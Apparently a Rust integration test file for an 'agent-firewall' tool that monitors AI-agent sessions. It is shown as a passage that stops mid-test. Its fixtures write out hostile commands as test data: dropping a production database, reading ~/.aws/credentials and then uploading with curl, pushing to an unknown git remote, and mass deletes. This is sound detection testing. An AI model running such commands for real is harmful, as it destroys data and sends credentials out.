//! Tests of the command-line interface.
//!
//! These tests run the real binary. They prove that the sub-commands work
//! together, and that the firewall stops a dangerous action.

use std::path::{Path, PathBuf};
use std::process::Command;

/// Returns the path of the binary that cargo built for this test.
fn binary() -> PathBuf {
    let mut path = std::env::current_exe().expect("test binary path");
    path.pop();
    if path.ends_with("deps") {
        path.pop();
    }
    path.join("agent-firewall")
}

/// Returns the root of the repository.
fn repo_root() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(|p| p.parent())
        .expect("repository root")
        .to_path_buf()
}

/// Runs the firewall and returns the exit code, the output and the errors.
fn firewall(args: &[&str]) -> (i32, String, String) {
    let output = Command::new(binary())
        .args(args)
        .current_dir(repo_root())
        .output()
        .expect("the binary must run");
    (
        output.status.code().unwrap_or(-1),
        String::from_utf8_lossy(&output.stdout).to_string(),
        String::from_utf8_lossy(&output.stderr).to_string(),
    )
}

/// Writes an executable fake `psql` that only appends to a marker file.
fn write_fake_psql(dir: &Path, marker: &Path) {
    use std::os::unix::fs::PermissionsExt;
    let path = dir.join("psql");
    std::fs::write(
        &path,
        format!(
            "#!/bin/sh\necho \"RUN: $*\"\necho \"EXECUTED: $*\" >> {}\n",
            marker.display()
        ),
    )
    .expect("write the fake client");
    let mut permissions = std::fs::metadata(&path).unwrap().permissions();
    permissions.set_mode(0o755);
    std::fs::set_permissions(&path, permissions).expect("make the client executable");
}

/// Returns a `PATH` that finds the fake client first.
fn path_with(dir: &Path) -> String {
    format!(
        "{}:{}",
        dir.display(),
        std::env::var("PATH").unwrap_or_default()
    )
}

#[test]
fn doctor_reports_the_interception_capability() {
    let (code, out, _) = firewall(&["doctor"]);
    assert_eq!(code, 0, "doctor must succeed on Linux");
    assert!(
        out.contains("exec_interception"),
        "doctor must report exec_interception, but it printed:\n{out}"
    );
}

#[test]
fn policy_list_shows_the_builtin_rules() {
    let (code, out, _) = firewall(&["policy", "list"]);
    assert_eq!(code, 0);
    assert!(out.contains("rule(s)"), "output was:\n{out}");
    assert!(
        out.contains("database."),
        "the built-in pack must hold database rules, but it printed:\n{out}"
    );
}

#[test]
fn policy_test_passes_for_the_builtin_rules() {
    let (code, out, err) = firewall(&["policy", "test"]);
    assert_eq!(code, 0, "policy tests failed:\n{out}\n{err}");
}

#[test]
fn policy_list_reports_rules_that_cannot_fire() {
    let (code, out, err) = firewall(&["policy", "list"]);
    assert_eq!(code, 0);
    assert!(
        out.contains("active"),
        "the count must name the active rules:\n{out}"
    );
    // The default filter lets the kernel drop an open that only reads, so a
    // rule about the path of a read stays silent. The user must be told,
    // instead of trusting a rule that never speaks.
    assert!(
        err.contains("cannot fire"),
        "the firewall must report the rules that cannot fire:\n{err}"
    );
    assert!(
        err.contains("filesystem.credentials.read"),
        "a rule about the path of a read needs the all-opens mode:\n{err}"
    );
    assert!(
        err.contains("all-opens"),
        "the report must name the mode that wakes the rule:\n{err}"
    );
    // The kernel filter observes a write and a connection, so those rules are
    // no longer dead.
    assert!(
        !err.contains("network.connect.production-host"),
        "a network rule fires on this monitor now:\n{err}"
    );
    assert!(
        !err.contains("filesystem.credentials.write"),
        "a rule about a write fires on this monitor now:\n{err}"
    );
}

#[test]
fn the_all_opens_mode_wakes_the_rules_about_a_read() {
    let (code, _out, err) = firewall(&["policy", "list", "--syscall-filter", "all-opens"]);
    assert_eq!(code, 0);
    assert!(
        !err.contains("cannot fire"),
        "every built-in rule fires in this mode:\n{err}"
    );
}

#[test]
fn the_off_mode_marks_every_file_and_network_rule() {
    let (code, _out, err) = firewall(&["policy", "list", "--syscall-filter", "off"]);
    assert_eq!(code, 0);
    for rule in [
        "filesystem.credentials.write",
        "filesystem.credentials.read",
        "network.connect.production-host",
    ] {
        assert!(
            err.contains(rule),
            "a session with no kernel filter cannot carry {rule}:\n{err}"
        );
    }
}

#[test]
fn an_unknown_filter_mode_is_refused() {
    let (code, _out, err) = firewall(&["policy", "list", "--syscall-filter", "everything"]);
    assert_ne!(code, 0, "the firewall must not guess what the user meant");
    assert!(
        err.contains("write-only"),
        "the error names the modes:\n{err}"
    );
}

#[test]
fn doctor_reports_the_inactive_rule_count() {
    let (code, out, _) = firewall(&["doctor"]);
    assert_eq!(code, 0);
    assert!(
        out.contains("inactive rules"),
        "doctor must name the rules that cannot fire:\n{out}"
    );
}

#[test]
fn doctor_reports_the_system_call_filter() {
    let (code, out, _) = firewall(&["doctor"]);
    assert_eq!(code, 0);
    assert!(
        out.contains("system-call filter: write-only"),
        "doctor must name the filter mode of the report:\n{out}"
    );
    assert!(
        out.contains("syscall_filter"),
        "doctor must report the probe of the kernel filter:\n{out}"
    );
    assert!(
        out.contains("file_open_events"),
        "doctor must report what the filter observes:\n{out}"
    );
}

#[test]
fn a_harmless_command_runs_without_a_question() {
    let (code, out, _) = firewall(&["run", "--approve", "deny", "--", "/bin/echo", "hello"]);
    assert_eq!(code, 0);
    assert!(out.contains("hello"), "output was:\n{out}");
}

#[test]
fn the_exit_code_of_the_child_reaches_the_caller() {
    let (code, _, _) = firewall(&["run", "--approve", "deny", "--", "/bin/sh", "-c", "exit 7"]);
    assert_eq!(code, 7);
}

#[test]
fn a_dangerous_command_is_stopped_and_recorded() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let marker = dir.path().join("marker");
    let trace = dir.path().join("trace.jsonl");
    let script = dir.path().join("drop.sh");
    write_fake_psql(dir.path(), &marker);
    std::fs::write(
        &script,
        "#!/bin/sh\npsql -c \"DROP DATABASE customer_prod\"\n",
    )
    .expect("write the script");

    let output = Command::new(binary())
        .args([
            "run",
            "--approve",
            "deny",
            "--trace",
            trace.to_str().unwrap(),
            "--",
            "/bin/sh",
            script.to_str().unwrap(),
        ])
        .env("PATH", path_with(dir.path()))
        .current_dir(repo_root())
        .output()
        .expect("the binary must run");

    let code = output.status.code().unwrap_or(-1);
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();

    assert_eq!(
        code, 3,
        "the firewall must report that it stopped the session:\n{stderr}"
    );
    assert!(
        !marker.exists(),
        "the dangerous statement ran, so the firewall did not stop it"
    );

    let recorded = std::fs::read_to_string(&trace).expect("the trace must exist");
    assert!(
        recorded.contains("database.destructive.drop-database"),
        "the trace must name the rule, but it holds:\n{recorded}"
    );

    let (tree_code, tree_out, _) = firewall(&["tree", trace.to_str().unwrap()]);
    assert_eq!(tree_code, 0);
    assert!(
        tree_out.contains("psql"),
        "the tree must show psql:\n{tree_out}"
    );

    let (replay_code, replay_out, _) = firewall(&["replay", trace.to_str().unwrap()]);
    assert_eq!(replay_code, 0);
    assert!(
        replay_out.contains("database.destructive.drop-database"),
        "the replay must find the rule again:\n{replay_out}"
    );
}

#[test]
fn the_user_can_allow_a_dangerous_command() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let marker = dir.path().join("marker");
    write_fake_psql(dir.path(), &marker);

    let output = Command::new(binary())
        .args([
            "run",
            "--approve",
            "allow",
            "--",
            "/bin/sh",
            "-c",
            "psql -c 'DROP DATABASE customer_prod'",
        ])
        .env("PATH", path_with(dir.path()))
        .current_dir(repo_root())
        .output()
        .expect("the binary must run");

    assert_eq!(output.status.code().unwrap_or(-1), 0);
    let recorded = std::fs::read_to_string(&marker)
        .expect("the user allowed the action, so the client must have run");
    assert!(
        recorded.contains("DROP DATABASE"),
        "marker holds:\n{recorded}"
    );
}

// ---------------------------------------------------------------------------
// Session memory in a replay
// ---------------------------------------------------------------------------

/// Nanoseconds in one second.
const SECOND: u64 = 1_000_000_000;

/// The time of the first event of a made trace.
const START: u64 = 1_700_000_000_000_000_000;

/// Returns the `session_start` line of a made trace.
///
/// The baseline travels inside the event, so the replay reads the git
/// remotes of the recorded session and never the remotes of this machine.
fn session_start_line() -> String {
    let meta = [
        String::from(r#""session_id":"afw-test-memory""#),
        format!(r#""started_at":{START}"#),
        String::from(r#""root_pid":100"#),
        String::from(r#""command":["claude"]"#),
        String::from(r#""cwd":"/home/dev/app""#),
        String::from(r#""agent":{"kind":"claude_code"}"#),
        String::from(r#""schema_version":1"#),
        String::from(r#""baseline":{"git_remotes":["origin","https://github.com/acme/app.git"]}"#),
    ]
    .join(",");
    let line = [
        String::from(r#""seq":1"#),
        format!(r#""ts":{START}"#),
        String::from(r#""session_id":"afw-test-memory""#),
        String::from(r#""pid":100"#),
        String::from(r#""type":"session_start""#),
        format!(r#""meta":{{{meta}}}"#),
        String::from(r#""capabilities":[]"#),
    ]
    .join(",");
    format!("{{{line}}}")
}

/// Returns a `process_exec` line of a made trace.
fn exec_line(seq: u64, at_seconds: u64, pid: i32, ppid: i32, comm: &str, argv: &[&str]) -> String {
    let ts = START + at_seconds * SECOND;
    let argv: Vec<String> = argv.iter().map(|a| format!("\"{a}\"")).collect();
    let argv = argv.join(",");
    let process = format!(
        r#"{{"pid":{pid},"ppid":{ppid},"exe":"/usr/bin/{comm}","comm":"{comm}","argv":[{argv}],"cwd":"/home/dev/app"}}"#
    );
    format!(
        r#"{{"seq":{seq},"ts":{ts},"session_id":"afw-test-memory","pid":{pid},"type":"process_exec","process":{process}}}"#
    )
}

/// Writes a trace with the credential chain, a delete burst and a safe push.
fn write_memory_trace(path: &Path) {
    let mut lines = vec![
        session_start_line(),
        exec_line(2, 0, 100, 1, "claude", &["claude"]),
        exec_line(3, 1, 200, 100, "bash", &["bash"]),
        // The chain of requirement B.1: read a credential, then send data out.
        exec_line(
            4,
            2,
            300,
            200,
            "cat",
            &["cat", "/home/dev/.aws/credentials"],
        ),
        exec_line(
            5,
            3,
            301,
            200,
            "curl",
            &["curl", "-T", "report.txt", "https://files.example.com/u"],
        ),
        // Requirement B.3: a push to the remote of the work tree is normal.
        exec_line(6, 4, 302, 200, "git", &["git", "push", "origin", "main"]),
        // Requirement B.3: a push to a remote that the session added is not.
        exec_line(7, 5, 303, 200, "git", &["git", "push", "--all", "backup"]),
    ];
    // Requirement B.2: twenty deletes inside one minute.
    for step in 0..20u64 {
        lines.push(exec_line(
            8 + step,
            600 + step,
            400 + step as i32,
            200,
            "rm",
            &["rm", "-f", "build/tmp.o"],
        ));
    }
    let mut text = lines.join("\n");
    text.push('\n');
    std::fs::write(path, text).expect("write the trace");
}

#[test]
fn a_replay_finds_the_chain_the_burst_and_the_new_remote() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let trace = dir.path().join("memory.jsonl");
    write_memory_trace(&trace);

    let (code, out, err) = firewall(&["replay", trace.to_str().unwrap(), "--json"]);
    assert_eq!(code, 0, "{err}");

    for wanted in [
        "memory.credentials.read-mark",
        "memory.exfil.after-credential-read",
        "memory.git.push-unknown-remote",
        "memory.filesystem.delete-burst",
    ] {
        assert!(
            out.contains(wanted),
            "the replay must find {wanted}:\n{out}"
        );
    }

    // The push to the remote that the work tree already had must stay quiet,
    // and the burst must report one time only, at the twentieth delete.
    assert_eq!(
        out.matches("memory.git.push-unknown-remote").count(),
        1,
        "only the new remote may match:\n{out}"
    );
    assert_eq!(
        out.matches("memory.filesystem.delete-burst").count(),
        1,
        "the burst may report one time only:\n{out}"
    );
}

/// Writes a trace where the two halves of the chain sit in two tool calls.
///
/// An agent runs every tool call as its own shell under the session root, so
/// the read and the upload hang under two different children of the root.
/// This is the ordinary shape of the attack, and the rule must see it.
fn write_two_tool_call_trace(path: &Path) {
    let lines = [
        session_start_line(),
        exec_line(2, 0, 100, 1, "claude", &["claude"]),
        // The first tool call reads the credential store.
        exec_line(
            3,
            1,
            200,
            100,
            "sh",
            &["sh", "-c", "cat ~/.aws/credentials"],
        ),
        exec_line(
            4,
            2,
            300,
            200,
            "cat",
            &["cat", "/home/dev/.aws/credentials"],
        ),
        // The second tool call, a different subtree, sends data away.
        exec_line(5, 3, 201, 100, "sh", &["sh", "-c", "curl -T report.txt"]),
        exec_line(
            6,
            4,
            301,
            201,
            "curl",
            &["curl", "-T", "report.txt", "https://files.example.com/u"],
        ),
    ];
    let mut text = lines.join("\n");
    text.push('\n');
    std::fs::write(path, text).expect("write the trace");
}

/// The chain must cross the boundary of one tool call.
#[test]
fn a_replay_finds_a_chain_that_two_tool_calls_share() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let trace = dir.path().join("two-calls.jsonl");
    write_two_tool_call_trace(&trace);

    let (code, out, err) = firewall(&["replay", trace.to_str().unwrap(), "--json"]);
    assert_eq!(code, 0, "{err}");
    assert!(
        out.contains("memory.exfil.after-credential-read"),
        "the read and the upload are two tool calls of one session, and the \
         pair must still be found:\n{out}"
    );
}

/// Returns a `stdin_write` line of a made trace.
fn stdin_line(seq: u64, at_seconds: u64, pid: i32, data: &str) -> String {
    let ts = START + at_seconds * SECOND;
    format!(
        r#"{{"seq":{seq},"ts":{ts},"session_id":"afw-test-memory","pid":{pid},"type":"stdin_write","stream":"stdin","data":"{data}"}}"#
    )
}

/// A replay must judge what a live session judges, the input included.
///
/// The monitor emits the content of standard input directly after the exec
/// event, and the live session judges the two together, in one verdict, at the
/// time of the exec. A replay that skipped the input would answer differently
/// for the same session.
#[test]
fn a_replay_judges_the_standard_input_of_a_process() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let trace = dir.path().join("stdin.jsonl");
    let lines = [
        session_start_line(),
        exec_line(2, 0, 100, 1, "claude", &["claude"]),
        exec_line(3, 1, 200, 100, "psql", &["psql", "-q"]),
        stdin_line(4, 1, 200, "DROP DATABASE customer_prod;"),
    ];
    let mut text = lines.join("\n");
    text.push('\n');
    std::fs::write(&trace, text).expect("write the trace");

    let (code, out, err) = firewall(&["replay", trace.to_str().unwrap(), "--json"]);
    assert_eq!(code, 0, "{err}");
    assert!(
        out.contains("database.destructive.drop-database"),
        "the statement stands in the input and not in the command line, and a \
         replay must still find it:\n{out}"
    );
}

#[test]
fn two_replays_of_one_trace_give_the_same_answer() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let trace = dir.path().join("memory.jsonl");
    write_memory_trace(&trace);

    let (first_code, first, _) = firewall(&["replay", trace.to_str().unwrap(), "--json"]);
    let (second_code, second, _) = firewall(&["replay", trace.to_str().unwrap(), "--json"]);
    assert_eq!(first_code, 0);
    assert_eq!(second_code, 0);
    assert_eq!(first, second, "a replay must repeat itself exactly");
}

// ---------------------------------------------------------------------------
// What a running program does
// ---------------------------------------------------------------------------

/// Returns a `file_open` line of a made trace.
fn file_open_line(seq: u64, at_seconds: u64, pid: i32, path: &str, write: bool) -> String {
    let ts = START + at_seconds * SECOND;
    format!(
        r#"{{"seq":{seq},"ts":{ts},"session_id":"afw-test-memory","pid":{pid},"type":"file_open","path":"{path}","write":{write}}}"#
    )
}

/// Returns a `network_connect` line of a made trace.
fn connect_line(seq: u64, at_seconds: u64, pid: i32, host: &str, addr: &str, port: u16) -> String {
    let ts = START + at_seconds * SECOND;
    format!(
        r#"{{"seq":{seq},"ts":{ts},"session_id":"afw-test-memory","pid":{pid},"type":"network_connect","addr":"{addr}","port":{port},"host":"{host}"}}"#
    )
}

/// Writes a trace of what one running program did, with no new program.
///
/// Every action here happens inside one process. Before the kernel filter the
/// firewall saw none of it, and the rules that judge it were dead.
fn write_inproc_trace(path: &Path) {
    let mut lines = vec![
        session_start_line(),
        exec_line(2, 0, 100, 1, "python3", &["python3", "agent.py"]),
        // The write to a credential file: `filesystem.credentials.write`.
        file_open_line(3, 1, 100, "/home/dev/.ssh/id_ed25519", true),
        // The write to /etc: `filesystem.etc.write`.
        file_open_line(4, 2, 100, "/etc/hosts", true),
        // A read of a credential store: `filesystem.credentials.read` and
        // `memory.credentials.read-mark`.
        file_open_line(5, 3, 100, "/home/dev/.aws/credentials", false),
        // The connection to a production host:
        // `network.connect.production-host` and `network.connect.remote-database`.
        connect_line(6, 4, 100, "db.prod.example.com", "203.0.113.30", 5432),
        // A source file and a local port are ordinary work and stay quiet.
        file_open_line(7, 5, 100, "/home/dev/app/src/main.rs", true),
        connect_line(8, 6, 100, "localhost", "127.0.0.1", 5432),
    ];
    let mut text = lines.join("\n");
    lines.clear();
    text.push('\n');
    std::fs::write(path, text).expect("write the trace");
}

#[test]
fn a_replay_judges_a_file_open_and_a_connection() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let trace = dir.path().join("inproc.jsonl");
    write_inproc_trace(&trace);

    let (code, out, err) = firewall(&["replay", trace.to_str().unwrap(), "--json"]);
    assert_eq!(code, 0, "{err}");

    // These rules were written for this monitor and could never fire before.
    for wanted in [
        "filesystem.credentials.write",
        "filesystem.etc.write",
        "filesystem.credentials.read",
        "network.connect.production-host",
        "network.connect.remote-database",
        "memory.credentials.read-mark",
    ] {
        assert!(
            out.contains(wanted),
            "the replay must find {wanted}:\n{out}"
        );
    }

    // A source file and a local database are ordinary work.
    assert!(
        !out.contains("main.rs"),
        "a write to a source file must stay quiet:\n{out}"
    );
    assert_eq!(
        out.matches("network.connect.remote-database").count(),
        1,
        "only the remote database matches, not the local one:\n{out}"
    );
}

#[test]
fn the_replay_summary_counts_every_kind_of_event() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let trace = dir.path().join("inproc.jsonl");
    write_inproc_trace(&trace);

    let (code, out, err) = firewall(&["replay", trace.to_str().unwrap()]);
    assert_eq!(code, 0, "{err}");
    assert!(
        out.contains(
            "1 exec, 4 file, 2 network, 0 signal, 0 io_uring, 0 tamper and 0 discrepancy event(s) evaluated"
        ),
        "the summary must count what it judged:\n{out}"
    );
}

#[test]
fn two_replays_of_a_file_and_network_trace_give_the_same_answer() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let trace = dir.path().join("inproc.jsonl");
    write_inproc_trace(&trace);

    let (first_code, first, _) = firewall(&["replay", trace.to_str().unwrap(), "--json"]);
    let (second_code, second, _) = firewall(&["replay", trace.to_str().unwrap(), "--json"]);
    assert_eq!(first_code, 0);
    assert_eq!(second_code, 0);
    assert_eq!(first, second, "a replay must repeat itself exactly");
}

/// Writes an executable fake `curl` that reports its arguments.
fn write_fake_curl(dir: &Path) -> PathBuf {
    use std::os::unix::fs::PermissionsExt;
    let path = dir.join("curl");
    std::fs::write(&path, "#!/bin/sh\necho \"UPLOAD: $*\"\n").expect("write the fake client");
    let mut permissions = std::fs::metadata(&path).unwrap().permissions();
    permissions.set_mode(0o755);
    std::fs::set_permissions(&path, permissions).expect("make the client executable");
    path
}

/// The default trace of a live chain must replay to the same chain.
///
/// This is the promise of `--retention balanced`: an action that a rule
/// matched stays in storage. The credential reads here are opens **inside**
/// one running program, they match rules of the level `info` only, and the
/// session memory of the replay is built from exactly those events. A trace
/// that dropped them replayed to nothing.
#[test]
fn a_live_chain_replays_from_the_default_trace() {
    let Some(python) = python3() else {
        eprintln!("no python3 on this machine, so the live chain test cannot run");
        return;
    };
    let dir = tempfile::tempdir().expect("temporary directory");
    let home = dir.path();
    let trace = home.join("trace.jsonl");
    let workload = home.join("agent.py");
    let curl = write_fake_curl(home);

    // Three different credential stores, read inside one process.
    std::fs::create_dir(home.join(".ssh")).expect("make the key directory");
    std::fs::create_dir(home.join(".aws")).expect("make the aws directory");
    std::fs::write(home.join(".ssh").join("id_ed25519"), "key").expect("write the key");
    std::fs::write(home.join(".aws").join("credentials"), "secret").expect("write the credentials");
    std::fs::write(home.join(".npmrc"), "//registry/:_authToken=x").expect("write the npmrc");

    let source = format!(
        "import subprocess\n\
         for name in ['.aws/credentials', '.ssh/id_ed25519', '.npmrc']:\n\
         \x20   open({home:?} + '/' + name).read()\n\
         subprocess.run([{curl:?}, '-T', 'report.txt', 'https://files.example.com/u'])\n",
        home = home.to_string_lossy(),
        curl = curl.to_string_lossy(),
    );
    std::fs::write(&workload, source).expect("write the workload");

    // No `--retention`, so the session uses the default. The filter must hold
    // an open that only reads, or the firewall never sees a credential read.
    let (code, out, err) = firewall(&[
        "run",
        "--approve",
        "allow",
        "--syscall-filter",
        "all-opens",
        "--trace",
        trace.to_str().unwrap(),
        "--",
        python,
        workload.to_str().unwrap(),
    ]);
    assert_eq!(code, 0, "the session must run to its end:\n{out}\n{err}");

    let recorded = std::fs::read_to_string(&trace).expect("the trace file");
    for wanted in [
        "memory.credentials.read-mark",
        "memory.secrets.credential-fan-out",
        "memory.exfil.after-credential-read",
    ] {
        assert!(
            recorded.contains(wanted) || err.contains(wanted),
            "the live session must find {wanted}:\n{err}"
        );
    }

    // The same trace, judged again by the same rules, must find the same
    // chain. This is what a dropped file event took away.
    let (replay_code, replay_out, replay_err) =
        firewall(&["replay", trace.to_str().unwrap(), "--json"]);
    assert_eq!(replay_code, 0, "{replay_err}");
    for wanted in [
        "memory.credentials.read-mark",
        "memory.secrets.credential-fan-out",
        "memory.exfil.after-credential-read",
    ] {
        assert!(
            replay_out.contains(wanted),
            "the replay of the default trace must find {wanted} again:\n{replay_out}"
        );
    }
}

/// Returns the interpreter of the gap workload, when the machine has one.
fn python3() -> Option<&'static str> {
    ["/usr/bin/python3", "/bin/python3"]
        .into_iter()
        .find(|path| Path::new(path).exists())
}

/// Writes a policy that refuses a connection to one port.
///
/// No built-in rule stops a connection today; they all report. The test needs
/// a rule that really says no, so it brings its own.
fn write_connect_policy(path: &Path, port: u16) {
    let text = format!(
        "version: 1\n\
         name: test.connect\n\
         description: Refuses the connection of the test.\n\
         rules:\n\
         \x20 - id: test.connect.refused\n\
         \x20   title: The test refuses this port\n\
         \x20   category: network\n\
         \x20   risk: blocked\n\
         \x20   decision: deny\n\
         \x20   reason: The test asks the firewall to refuse this connection.\n\
         \x20   match:\n\
         \x20     action: network_connect\n\
         \x20     port: {port}\n"
    );
    std::fs::write(path, text).expect("write the policy");
}

/// The gap of `docs/DETECTION-RESEARCH.md` section 3, closed.
///
/// One process, no new program. Before the kernel filter the trace held no
/// file event, no network event and no decision, and `--approve deny` denied
/// nothing because it saw nothing.
#[test]
fn one_process_that_writes_and_connects_is_now_held() {
    let Some(python) = python3() else {
        eprintln!("no python3 on this machine, so the gap test cannot run");
        return;
    };
    let dir = tempfile::tempdir().expect("temporary directory");
    let home = dir.path();
    // The directory is made before the session, so every action of the
    // session itself happens inside the one interpreter process and starts no
    // program of its own. That is what makes this the in-process gap.
    std::fs::create_dir(home.join(".ssh")).expect("make the key directory");
    let key = home.join(".ssh").join("id_ed25519");
    let after = home.join("after.txt");
    let trace = home.join("trace.jsonl");
    let policy = home.join("connect.yaml");
    let workload = home.join("agent.py");

    let listener =
        std::net::TcpListener::bind("127.0.0.1:0").expect("a free port on the loopback address");
    let port = listener.local_addr().expect("the port").port();
    write_connect_policy(&policy, port);

    // The workload handles both errors itself, so the run proves that the
    // process is still alive after each refusal.
    let source = format!(
        "import socket\n\
         try:\n\
         \x20   open({key:?}, 'w').write('key')\n\
         except OSError as error:\n\
         \x20   print('write refused:', error)\n\
         sock = socket.socket()\n\
         try:\n\
         \x20   sock.connect(('127.0.0.1', {port}))\n\
         except OSError as error:\n\
         \x20   print('connect refused:', error)\n\
         open({after:?}, 'w').write('done')\n",
        key = key.to_string_lossy(),
        after = after.to_string_lossy(),
    );
    std::fs::write(&workload, source).expect("write the workload");

    let (code, out, err) = firewall(&[
        "run",
        "--approve",
        "deny",
        "--retention",
        "all",
        "--policy",
        policy.to_str().unwrap(),
        "--trace",
        trace.to_str().unwrap(),
        "--",
        python,
        workload.to_str().unwrap(),
    ]);

    // The firewall stopped something, so it reports the blocked exit code.
    assert_eq!(
        code, 3,
        "the firewall must report that it stopped an action:\n{out}\n{err}"
    );

    // The two refused actions never happened, and the process ran on.
    assert!(
        !key.exists(),
        "the refused write must not make the key file {}",
        key.display()
    );
    assert!(
        after.exists(),
        "the process keeps running after a refusal, so its last command works"
    );
    // The program saw an ordinary permission error and could report it. A
    // `SIGKILL` would have taken that chance away.
    assert!(
        out.contains("write refused") && out.contains("connect refused"),
        "the program handles the refusal itself:\n{out}"
    );

    // The trace now holds what the exec boundary could never see.
    let recorded = std::fs::read_to_string(&trace).expect("the trace file");
    assert!(
        recorded.contains("\"type\":\"file_open\""),
        "the trace must hold the file action of the one process:\n{recorded}"
    );
    assert!(
        recorded.contains("\"type\":\"network_connect\""),
        "the trace must hold the connection of the one process:\n{recorded}"
    );
    assert!(
        recorded.contains("filesystem.credentials.write"),
        "the rule about a credential write must fire:\n{recorded}"
    );
    assert!(
        recorded.contains("test.connect.refused"),
        "the rule about the connection must fire:\n{recorded}"
    );
}

/// The kernel floor carries rule classes of the built-in pack, so the table
/// in the monitor and the pack itself must agree: every class the floor
/// names exists, and the classes that remove a question are rules that stop
/// the user today. `research/spikes/landlock/tests/count-rules.py` guards
/// the other side of the deal, against the rule files.
#[test]
fn the_kernel_floor_names_rules_that_the_pack_really_carries() {
    use af_core::PolicyEngine as _;

    let policy = af_policy::PolicySet::builtin().expect("the built-in pack loads");
    let decisions: std::collections::HashMap<_, _> = policy
        .rules()
        .into_iter()
        .map(|rule| (rule.rule_id, rule.decision))
        .collect();

    // The classes of the floor are not exported through the public API of
    // the monitor, so the test reads them the way a session does: from a
    // kernel_floor event of a real session.
    let dir = tempfile::tempdir().expect("temporary directory");
    let trace = dir.path().join("floor.jsonl");
    let (code, out, err) = firewall(&[
        "run",
        "--approve",
        "deny",
        "--landlock",
        "on",
        "--trace",
        trace.to_str().unwrap(),
        "--",
        "/bin/true",
    ]);
    assert_eq!(code, 0, "the session runs:\n{out}\n{err}");

    let floors: Vec<_> = std::fs::read_to_string(&trace)
        .expect("the trace file")
        .lines()
        .filter_map(|line| serde_json::from_str::<serde_json::Value>(line).ok())
        .filter(|event| event["type"] == "kernel_floor")
        .collect();
    assert_eq!(floors.len(), 1, "one kernel floor per session");
    let rules = floors[0]["rules"]
        .as_array()
        .expect("the floor names its rule classes");
    assert!(!rules.is_empty(), "the floor carries at least one class");

    for rule in rules {
        let id = rule.as_str().expect("a rule identifier");
        let decision = decisions.get(id).unwrap_or_else(|| {
            panic!("the floor names {id}, which the built-in pack does not carry")
        });
        assert_eq!(
            *decision,
            af_core::Decision::ApprovalRequired,
            "the floor may only remove a question, and {id} does not ask one today"
        );
    }

    // A machine without Landlock keeps the questions, and says so.
    let (code, out, err) = firewall(&[
        "run",
        "--approve",
        "deny",
        "--landlock",
        "off",
        "--trace",
        dir.path().join("nofloor.jsonl").to_str().unwrap(),
        "--",
        "/bin/true",
    ]);
    assert_eq!(code, 0, "the session runs:\n{out}\n{err}");
    let nofloor = std::fs::read_to_string(dir.path().join("nofloor.jsonl")).expect("trace");
    assert!(
        !nofloor.contains("\"type\":\"kernel_floor\""),
        "a session with the floor switched off records no floor event"
    );
}

// ---------------------------------------------------------------------------
// Telemetry: consent, samples, inspection, destruction
// ---------------------------------------------------------------------------

/// Runs the firewall with owned arguments and returns the code and output.
fn firewall_owned(args: &[String]) -> (i32, String, String) {
    let refs: Vec<&str> = args.iter().map(String::as_str).collect();
    firewall(&refs)
}

/// Grants every scope through a consent file in a temporary directory.
fn grant_all(config: &Path) {
    let (code, out, err) = firewall_owned(&[
        "telemetry".into(),
        "on".into(),
        "--scope".into(),
        "all".into(),
        "--config".into(),
        config.display().to_string(),
    ]);
    assert_eq!(code, 0, "the grant must succeed:\n{out}\n{err}");
}

#[test]
fn telemetry_defaults_to_off_and_names_the_promises() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let config = dir.path().join("telemetry.json");
    let outbox = dir.path().join("outbox");

    let (code, out, err) = firewall_owned(&[
        "telemetry".into(),
        "status".into(),
        "--config".into(),
        config.display().to_string(),
        "--outbox".into(),
        outbox.display().to_string(),
    ]);
    assert_eq!(code, 0, "{err}");
    assert!(out.contains("telemetry: off"), "off is the default:\n{out}");
    assert!(
        out.contains("the product is complete without it"),
        "the disclosure must say that telemetry is never a condition:\n{out}"
    );
    assert!(
        out.contains("nothing is sent anywhere"),
        "the disclosure must say that samples stay local:\n{out}"
    );
}

#[test]
fn consent_is_granular_and_revocable_from_the_cli() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let config = dir.path().join("telemetry.json");
    let flag = config.display().to_string();
    let scope = |word: &str| vec!["--scope".to_string(), word.to_string()];

    // Grant two of the five scopes; `content` and `env` stay off.
    let (code, out, err) = firewall_owned(
        &[
            vec!["telemetry".into(), "on".into()],
            scope("tree"),
            scope("actions"),
            vec!["--config".into(), flag.clone()],
        ]
        .concat(),
    );
    assert_eq!(code, 0, "{err}");
    assert!(out.contains("granted: tree"), "{out}");
    assert!(out.contains("telemetry: on (tree, actions)"), "{out}");

    // Revoke one: the other stays.
    let (code, out, err) = firewall_owned(
        &[
            vec!["telemetry".into(), "off".into()],
            scope("tree"),
            vec!["--config".into(), flag.clone()],
        ]
        .concat(),
    );
    assert_eq!(code, 0, "{err}");
    assert!(out.contains("telemetry: on (actions)"), "{out}");

    // Revoke everything: telemetry is off again.
    let (code, out, err) = firewall_owned(&[
        "telemetry".into(),
        "off".into(),
        "--config".into(),
        flag.clone(),
    ]);
    assert_eq!(code, 0, "{err}");
    assert!(out.contains("telemetry: off"), "{out}");

    // An unknown scope is refused with the list.
    let (code, _out, err) = firewall_owned(
        &[
            vec!["telemetry".into(), "on".into()],
            scope("warp-drive"),
            vec!["--config".into(), flag],
        ]
        .concat(),
    );
    assert_ne!(code, 0, "the firewall must not guess a scope");
    assert!(err.contains("tree"), "the error names the scopes:\n{err}");
}

/// Writes a fake `psql` that carries a credential on its command line.
#[test]
fn a_sample_is_generated_inspected_and_destroyed_locally() {
    let dir = tempfile::tempdir().expect("temporary directory");
    let marker = dir.path().join("marker");
    write_fake_psql(dir.path(), &marker);
    let trace = dir.path().join("trace.jsonl");
    let config = dir.path().join("telemetry.json");
    let outbox = dir.path().join("outbox");

    // A denied session with a credential on the command line.
    let output = Command::new(binary())
        .args([
            "run",
            "--approve",
            "deny",
            "--trace",
            trace.to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
